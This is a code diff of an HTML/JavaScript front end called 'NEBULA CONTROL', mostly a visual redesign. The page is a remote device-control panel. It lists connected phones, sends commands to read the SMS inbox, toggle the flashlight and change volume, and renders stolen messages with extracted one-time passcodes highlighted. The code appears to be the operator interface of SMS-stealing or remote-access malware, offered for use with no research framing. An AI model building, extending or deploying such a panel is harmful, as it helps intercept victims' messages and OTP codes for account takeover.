@@ -1,211 +1,169 @@
 <!doctype html>
-<html lang="en">
+<html lang="en" data-t="dark">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<meta name="theme-color" content="#050507">
+<meta name="theme-color" content="#070709">
 <title>NEBULA</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700;800;900&family=JetBrains+Mono:wght@500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter+Tight:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="/style.css">
+<script type="importmap">
+{
+  "imports": {
+    "three": "https://unpkg.com/three@0.169.0/build/three.module.js",
+    "three/addons/": "https://unpkg.com/three@0.169.0/examples/jsm/"
+  }
+}
+</script>
 </head>
 <body>
+<canvas id="fx" aria-hidden="true"></canvas>
+<div class="grain" aria-hidden="true"></div>
 
-<canvas id="bg3d"></canvas>
-<div class="grain"></div>
+<div class="app" id="app">
 
-<div id="loadingView" class="loader">
-  <div class="loader-inner">
-    <div class="brand-mark"></div>
+  <!-- LOADING -->
+  <div id="loadingView" class="login-wrap">
     <div class="loader-label">INITIALIZING</div>
   </div>
-</div>
 
-<div id="panelView" class="hidden">
-  <header class="topbar">
-    <div class="brand">
-      <div class="brand-mark small"></div>
-      <h1>NEBULA</h1>
-    </div>
-    <button id="logoutBtn" class="btn ghost">SIGN OUT</button>
-  </header>
-
-  <main class="layout">
-    <section class="card" data-tilt>
-      <div class="card-head">
-        <span class="kicker">DEVICES</span>
-        <span id="devCount" class="badge">0</span>
+  <!-- PANEL -->
+  <section id="panelView" class="scr hidden">
+    <div class="top"><div class="row">
+      <div class="logo">
+        <div class="mark"><span>N</span><i></i></div>
+        <span class="brand">NEBULA <b>CONTROL</b></span>
       </div>
-      <div class="select-wrap">
-        <select id="deviceSelect" class="select">
-          <option value="">SELECT DEVICE</option>
-        </select>
+      <div class="tools">
+        <button class="ib" id="refreshTop" aria-label="Refresh">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 11-3-6.7L21 8"/><path d="M21 3v5h-5"/></svg>
+        </button>
+        <button class="ib" id="logoutBtn" aria-label="Sign out">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 4h4a1 1 0 011 1v14a1 1 0 01-1 1h-4"/><path d="M10 17l-5-5 5-5"/><path d="M5 12h12"/></svg>
+        </button>
       </div>
-    </section>
+    </div></div>
 
-    <div id="emptyState" class="empty">
-      <div class="empty-glyph"></div>
-      <div class="empty-title">NO DEVICE SELECTED</div>
-      <div class="empty-sub">Choose a device to begin</div>
+    <!-- HERO -->
+    <div class="hero">
+      <div class="hero-stage">
+        <canvas class="hero3d" id="hero3d" aria-hidden="true"></canvas>
+        <div class="hero-plane">
+          <h1>
+            <span class="l"><i>NEBULA</i></span>
+            <span class="l"><i>CONTROL</i></span>
+            <span class="l sub"><i>REMOTE ENGINE</i></span>
+          </h1>
+          <div class="pills">
+            <span class="pl">LIVE</span>
+            <span class="pl">SECURE</span>
+            <span class="pl">REMOTE</span>
+          </div>
+        </div>
+      </div>
     </div>
 
+    <!-- DEVICE -->
+    <div class="st">
+      <span>DEVICE</span>
+      <small id="devCount">00</small>
+    </div>
+    <div class="dsel-wrap">
+      <select id="deviceSelect" class="dsel">
+        <option value="">SELECT DEVICE</option>
+      </select>
+    </div>
+
+    <!-- EMPTY -->
+    <div id="emptyState" class="em2">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="4" y="3" width="16" height="18" rx="3"/>
+        <path d="M10 18h4"/>
+      </svg>
+      <h3>NO DEVICE SELECTED</h3>
+      <p class="hint">CHOOSE A DEVICE FROM THE LIST ABOVE TO BEGIN</p>
+    </div>
+
+    <!-- DETAIL -->
     <div id="detailView" class="hidden">
-      <section class="card" data-tilt>
-        <div class="card-head">
-          <span class="kicker">CONTROL</span>
-        </div>
 
-        <div class="group">
-          <div class="group-label">NETWORK</div>
-          <div class="cmd-grid">
-            <button class="cmd-btn" data-action="ping">
-              <span class="cmd-icon" data-icon="ping"></span>
-              <span class="label">PING</span>
-            </button>
-            <button class="cmd-btn" data-action="sms">
-              <span class="cmd-icon" data-icon="sms"></span>
-              <span class="label">SMS</span>
-            </button>
-          </div>
-        </div>
+      <div class="st">
+        <span>NETWORK</span>
+        <small>01</small>
+      </div>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-action="ping">
+          <span class="cmd-icon" data-icon="ping"></span>
+          <span class="label">PING</span>
+          <span class="sub">CHECK RESPONSE</span>
+        </button>
+        <button class="cmd-btn" data-action="sms">
+          <span class="cmd-icon" data-icon="sms"></span>
+          <span class="label">SMS</span>
+          <span class="sub">READ INBOX</span>
+        </button>
+      </div>
 
-        <div class="group">
-          <div class="group-label">HARDWARE</div>
-          <div class="cmd-grid">
-            <button class="cmd-btn" data-action="flash_on">
-              <span class="cmd-icon" data-icon="flash"></span>
-              <span class="label">FLASH ON</span>
-            </button>
-            <button class="cmd-btn" data-action="flash_off">
-              <span class="cmd-icon" data-icon="flash-off"></span>
-              <span class="label">FLASH OFF</span>
-            </button>
-          </div>
-        </div>
+      <div class="st">
+        <span>HARDWARE</span>
+        <small>02</small>
+      </div>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-action="flash_on">
+          <span class="cmd-icon" data-icon="flash"></span>
+          <span class="label">FLASH ON</span>
+          <span class="sub">ACTIVATE</span>
+        </button>
+        <button class="cmd-btn" data-action="flash_off">
+          <span class="cmd-icon" data-icon="flash-off"></span>
+          <span class="label">FLASH OFF</span>
+          <span class="sub">DEACTIVATE</span>
+        </button>
+      </div>
 
-        <div class="group">
-          <div class="group-label">AUDIO</div>
-          <div class="cmd-grid">
-            <button class="cmd-btn" data-action="volume_max">
-              <span class="cmd-icon" data-icon="vol-max"></span>
-              <span class="label">MAX</span>
-            </button>
-            <button class="cmd-btn" data-action="volume_mute">
-              <span class="cmd-icon" data-icon="vol-mute"></span>
-              <span class="label">MUTE</span>
-            </button>
-          </div>
-        </div>
-      </section>
+      <div class="st">
+        <span>AUDIO</span>
+        <small>03</small>
+      </div>
+      <div class="cmd-grid">
+        <button class="cmd-btn" data-action="volume_max">
+          <span class="cmd-icon" data-icon="vol-max"></span>
+          <span class="label">MAX</span>
+          <span class="sub">FULL VOLUME</span>
+        </button>
+        <button class="cmd-btn" data-action="volume_mute">
+          <span class="cmd-icon" data-icon="vol-mute"></span>
+          <span class="label">MUTE</span>
+          <span class="sub">SILENT</span>
+        </button>
+      </div>
 
-      <section class="card" data-tilt>
-        <div class="card-head">
-          <span class="kicker">ACTIVITY</span>
-          <span id="logCount" class="badge">0</span>
-        </div>
-        <div id="logList">
-          <div class="muted">AWAITING DATA</div>
-        </div>
-      </section>
+      <div class="st">
+        <span>ACTIVITY</span>
+        <small id="logCount">00</small>
+      </div>
+      <div id="logList" class="logs">
+        <div class="muted">AWAITING DATA</div>
+      </div>
+
+      <div class="foot">© 2026 NEBULA · REMOTE ENGINE</div>
     </div>
-  </main>
+  </section>
 
-  <nav class="bottom-nav">
-    <button id="refreshBtn" class="btn">REFRESH</button>
-    <button id="autoBtn" class="btn">AUTO OFF</button>
-  </nav>
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<div id="toast" class="toast"></div>
+
 <script>
 const $ = id => document.getElementById(id);
 let selectedDevice = null;
 let logTimer = null;
-let autoTimer = null;
-let autoOn = false;
 
-/* ---------- 3D BACKGROUND ---------- */
-(function init3D() {
-  const canvas = $('bg3d');
-  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
-  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
-  renderer.setSize(window.innerWidth, window.innerHeight);
-
-  const scene = new THREE.Scene();
-  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 100);
-  camera.position.z = 6;
-
-  const group = new THREE.Group();
-  scene.add(group);
-
-  const geo = new THREE.IcosahedronGeometry(2.4, 1);
-  const mat = new THREE.MeshBasicMaterial({
-    color: 0xef4444,
-    wireframe: true,
-    transparent: true,
-    opacity: 0.28
-  });
-  const mesh = new THREE.Mesh(geo, mat);
-  group.add(mesh);
-
-  const geo2 = new THREE.IcosahedronGeometry(3.1, 0);
-  const mat2 = new THREE.MeshBasicMaterial({
-    color: 0xffffff,
-    wireframe: true,
-    transparent: true,
-    opacity: 0.05
-  });
-  const mesh2 = new THREE.Mesh(geo2, mat2);
-  group.add(mesh2);
-
-  const starGeo = new THREE.BufferGeometry();
-  const count = 900;
-  const positions = new Float32Array(count * 3);
-  for (let i = 0; i < count * 3; i++) {
-    positions[i] = (Math.random() - 0.5) * 40;
-  }
-  starGeo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
-  const starMat = new THREE.PointsMaterial({
-    color: 0xef4444,
-    size: 0.03,
-    transparent: true,
-    opacity: 0.6
-  });
-  const stars = new THREE.Points(starGeo, starMat);
-  scene.add(stars);
-
-  let mx = 0, my = 0;
-  document.addEventListener('mousemove', e => {
-    mx = (e.clientX / window.innerWidth - 0.5) * 2;
-    my = (e.clientY / window.innerHeight - 0.5) * 2;
-  });
-
-  const clock = new THREE.Clock();
-  function loop() {
-    const t = clock.getElapsedTime();
-    mesh.rotation.x = t * 0.15;
-    mesh.rotation.y = t * 0.22;
-    mesh2.rotation.x = -t * 0.08;
-    mesh2.rotation.y = t * 0.12;
-    stars.rotation.y = t * 0.02;
-    group.position.x += (mx * 0.4 - group.position.x) * 0.05;
-    group.position.y += (-my * 0.4 - group.position.y) * 0.05;
-    renderer.render(scene, camera);
-    requestAnimationFrame(loop);
-  }
-  loop();
-
-  window.addEventListener('resize', () => {
-    camera.aspect = window.innerWidth / window.innerHeight;
-    camera.updateProjectionMatrix();
-    renderer.setSize(window.innerWidth, window.innerHeight);
-  });
-})();
-
-/* ---------- ICONS (inline SVG) ---------- */
+/* ---------- ICONS ---------- */
 const ICONS = {
-  ping: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M2 12h4l3-8 4 16 3-8h6"/></svg>',
+  ping: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12h4l3-8 4 16 3-8h6"/></svg>',
   sms: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>',
   flash: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg>',
   'flash-off': '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h9l-1 8 10-12h-9z" opacity=".35"/><path d="M3 3l18 18"/></svg>',
@@ -216,6 +174,15 @@ document.querySelectorAll('.cmd-icon').forEach(el => {
   const n = el.getAttribute('data-icon');
   if (ICONS[n]) el.innerHTML = ICONS[n];
 });
+
+/* ---------- TOAST ---------- */
+function toast(msg) {
+  const el = $('toast');
+  el.textContent = msg;
+  el.classList.add('on');
+  clearTimeout(el._t);
+  el._t = setTimeout(() => el.classList.remove('on'), 2200);
+}
 
 /* ---------- AUTH ---------- */
 async function checkAuth() {
@@ -238,6 +205,12 @@ $('logoutBtn').onclick = async () => {
   location.href = '/login';
 };
 
+$('refreshTop').onclick = () => {
+  loadDevices();
+  if (selectedDevice) loadLogs();
+  toast('REFRESHED');
+};
+
 /* ---------- DEVICES ---------- */
 async function loadDevices() {
   try {
@@ -252,11 +225,12 @@ function renderDevices(devices) {
   const sel = $('deviceSelect');
   const current = sel.value;
   sel.innerHTML = '<option value="">SELECT DEVICE</option>';
-  $('devCount').textContent = devices.length;
+  $('devCount').textContent = String(devices.length).padStart(2, '0');
   devices.forEach(d => {
     const opt = document.createElement('option');
     opt.value = d.deviceId;
-    opt.textContent = `${(d.model || 'UNKNOWN').toUpperCase()} // ${d.deviceId} // ${d.online ? 'ONLINE' : 'OFFLINE'}`;
+    const status = d.online ? 'ONLINE' : 'OFFLINE';
+    opt.textContent = `${(d.model || 'UNKNOWN').toUpperCase()} · ${d.deviceId} · ${status}`;
     sel.appendChild(opt);
   });
   if (current) sel.value = current;
@@ -284,19 +258,19 @@ function selectDevice(id) {
 
 /* ---------- COMMANDS ---------- */
 document.querySelectorAll('.cmd-btn').forEach(btn => {
-  btn.addEventListener('click', async () => {
+  btn.onclick = async () => {
     if (!selectedDevice) { toast('SELECT DEVICE FIRST'); return; }
     const action = btn.getAttribute('data-action');
     await sendCommand(action, btn);
-  });
+  };
 });
 
 async function sendCommand(action, btn) {
   const labelEl = btn.querySelector('.label');
   const original = labelEl.textContent;
   btn.disabled = true;
-  labelEl.textContent = 'SENDING';
   btn.classList.add('loading');
+  labelEl.textContent = 'SENDING';
 
   try {
     const r = await fetch('/x/command', {
@@ -305,18 +279,18 @@ async function sendCommand(action, btn) {
       body: JSON.stringify({ deviceId: selectedDevice, action, args: {} }),
     });
     if (r.ok) {
-      toast(action.replace(/_/g, ' ').toUpperCase() + ' SENT');
+      toast(action.replace(/_/g, ' ') + ' SENT');
       setTimeout(loadLogs, 1500);
     } else {
-      toast('FAILED: ' + action.toUpperCase());
+      toast('FAILED · ' + action);
     }
   } catch {
     toast('NETWORK ERROR');
   }
 
   btn.disabled = false;
-  labelEl.textContent = original;
   btn.classList.remove('loading');
+  labelEl.textContent = original;
 }
 
 /* ---------- LOGS ---------- */
@@ -332,7 +306,7 @@ async function loadLogs() {
 
 function renderLogs(logs) {
   const list = $('logList');
-  $('logCount').textContent = logs.length;
+  $('logCount').textContent = String(logs.length).padStart(2, '0');
   if (!logs.length) {
     list.innerHTML = '<div class="muted">AWAITING DATA</div>';
     return;
@@ -385,46 +359,11 @@ function renderSmsTable(text) {
     html += '<td class="time-col">' + esc(r.time) + '</td>';
     html += '<td class="body-col">' + esc(r.body);
     if (r.otp) html += '<br><span class="otp-badge">OTP ' + esc(r.otp) + '</span>';
-    html += '</td>';
-    html += '</tr>';
+    html += '</td></tr>';
   });
   html += '</tbody></table>';
   return html;
 }
-
-/* ---------- TOAST ---------- */
-function toast(msg) {
-  const existing = document.querySelector('.toast');
-  if (existing) existing.remove();
-  const el = document.createElement('div');
-  el.className = 'toast';
-  el.textContent = msg;
-  document.body.appendChild(el);
-  setTimeout(() => {
-    el.classList.add('out');
-    setTimeout(() => el.remove(), 300);
-  }, 2200);
-}
-
-/* ---------- BUTTONS ---------- */
-$('refreshBtn').onclick = () => {
-  loadDevices();
-  if (selectedDevice) loadLogs();
-  toast('REFRESHED');
-};
-
-$('autoBtn').onclick = () => {
-  autoOn = !autoOn;
-  $('autoBtn').textContent = autoOn ? 'AUTO ON' : 'AUTO OFF';
-  $('autoBtn').classList.toggle('active', autoOn);
-  if (autoTimer) { clearInterval(autoTimer); autoTimer = null; }
-  if (autoOn && selectedDevice) {
-    autoTimer = setInterval(loadLogs, 3000);
-    toast('AUTO-REFRESH ENABLED');
-  } else {
-    toast('AUTO-REFRESH DISABLED');
-  }
-};
 
 function esc(s) {
   return String(s || '').replace(/[&<>"']/g, c => ({
@@ -432,23 +371,12 @@ function esc(s) {
   }[c]));
 }
 
-/* ---------- TILT CARDS ---------- */
-document.querySelectorAll('[data-tilt]').forEach(card => {
-  card.addEventListener('mousemove', e => {
-    const r = card.getBoundingClientRect();
-    const x = (e.clientX - r.left) / r.width - 0.5;
-    const y = (e.clientY - r.top) / r.height - 0.5;
-    card.style.transform = `perspective(1000px) rotateX(${-y * 3}deg) rotateY(${x * 3}deg) translateZ(0)`;
-  });
-  card.addEventListener('mouseleave', () => {
-    card.style.transform = 'perspective(1000px) rotateX(0) rotateY(0)';
-  });
-});
-
 checkAuth();
 setInterval(() => {
   if (!$('panelView').classList.contains('hidden')) loadDevices();
 }, 8000);
 </script>
+
+<script type="module" src="/3d.js"></script>
 </body>
 </html>
